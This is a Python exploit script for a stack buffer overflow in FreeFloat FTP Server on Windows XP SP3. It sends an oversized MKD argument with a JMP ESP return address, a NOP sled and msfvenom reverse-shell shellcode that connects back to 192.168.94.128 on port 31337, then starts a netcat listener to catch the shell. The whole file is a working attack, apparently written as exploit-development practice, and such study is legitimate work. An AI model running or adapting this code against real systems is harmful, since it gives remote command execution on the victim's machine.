#!/usr/bin/python
'''
Vulnarable App: https://www.exploit-db.com/apps/687ef6f72dcbbf5b2506e80a375377fa-freefloatftpserver.zip
'''
import sys
import socket
import struct
import subprocess

if len(sys.argv) < 2:
    print "[*] FreeFlot FTP exploit"
    print "[*] Usage: "+sys.argv[0]+" <ip addr>"
    sys.exit()

shellcode = (
"\xda\xc3\xbd\xfa\x9f\x84\xcc\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x83\xeb\xfc\x31\x6b\x13\x03\x91\x8c\x66\x39\x99\x5b\xe4"
"\xc2\x61\x9c\x89\x4b\x84\xad\x89\x28\xcd\x9e\x39\x3a\x83\x12"
"\xb1\x6e\x37\xa0\xb7\xa6\x38\x01\x7d\x91\x77\x92\x2e\xe1\x16"
"\x10\x2d\x36\xf8\x29\xfe\x4b\xf9\x6e\xe3\xa6\xab\x27\x6f\x14"
"\x5b\x43\x25\xa5\xd0\x1f\xab\xad\x05\xd7\xca\x9c\x98\x63\x95"
"\x3e\x1b\xa7\xad\x76\x03\xa4\x88\xc1\xb8\x1e\x66\xd0\x68\x6f"
"\x87\x7f\x55\x5f\x7a\x81\x92\x58\x65\xf4\xea\x9a\x18\x0f\x29"
"\xe0\xc6\x9a\xa9\x42\x8c\x3d\x15\x72\x41\xdb\xde\x78\x2e\xaf"
"\xb8\x9c\xb1\x7c\xb3\x99\x3a\x83\x13\x28\x78\xa0\xb7\x70\xda"
"\xc9\xee\xdc\x8d\xf6\xf0\xbe\x72\x53\x7b\x52\x66\xee\x26\x3b"
"\x4b\xc3\xd8\xbb\xc3\x54\xab\x89\x4c\xcf\x23\xa2\x05\xc9\xb4"
"\xc5\x3f\xad\x2a\x38\xc0\xce\x63\xff\x94\x9e\x1b\xd6\x94\x74"
"\xdb\xd7\x40\xda\x8b\x77\x3b\x9b\x7b\x38\xeb\x73\x91\xb7\xd4"
"\x64\x9a\x1d\x7d\x0e\x61\xf6\x42\x67\x37\x86\x2b\x7a\xc7\xfc"
"\xc2\xf3\x21\x6a\x05\x52\xfa\x03\xbc\xff\x70\xb5\x41\x2a\xfd"
"\xf5\xca\xd9\x02\xbb\x3a\x97\x10\x2c\xcb\xe2\x4a\xfb\xd4\xd8"
"\xe2\x67\x46\x87\xf2\xee\x7b\x10\xa5\xa7\x4a\x69\x23\x5a\xf4"
"\xc3\x51\xa7\x60\x2b\xd1\x7c\x51\xb2\xd8\xf1\xed\x90\xca\xcf"
"\xee\x9c\xbe\x9f\xb8\x4a\x68\x66\x13\x3d\xc2\x30\xc8\x97\x82"
"\xc5\x22\x28\xd4\xc9\x6e\xde\x38\x7b\xc7\xa7\x47\xb4\x8f\x2f"
"\x30\xa8\x2f\xcf\xeb\x68\x4f\x32\x39\x85\xf8\xeb\xa8\x24\x65"
"\x0c\x07\x6a\x90\x8f\xad\x13\x67\x8f\xc4\x16\x23\x17\x35\x6b"
"\x3c\xf2\x39\xd8\x3d\xd7")

# System Windows XP SP3 Professional x86
# EIP offset 69413269
# Badchars: \x00 \x0a \x0d
# 71A91C8B   FFE4 JMP ESP [wshtcpip.dll]
# msfvenom -p windows/shell_reverse_tcp LPORT=31337 LHOST=192.168.94.128 -a x86 -b '\x00\x0a\x0d' EXITFUNC=thread -f c

buffer = ""
buffer += "\x41" * 247
buffer += struct.pack("<L", 0x71a91c8b)
buffer += '\x90' * 16
buffer += shellcode

try:
    print '[*] Try to connect to the target'
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect((str(sys.argv[1]), 21))
    print '[*] Connected!'

    print '[*] Send the evil buffer'
    s.recv(1024)
    s.send('USER anonymous\r\n')
    s.recv(1024)
    s.send('PASS anonymous\r\n')
    s.recv(1024)
    s.send('MKD ' + buffer +'\r\n')
    s.recv(1024)
    s.send('QUIT\r\n')
    s.close()
    print '[*] Sended!'

except socket.error:
    print '[*] Host unreachable'
    sys.exit(1)
finally:
    cmd = "nc -lnvp 31337"
    subprocess.call([cmd], shell=True)

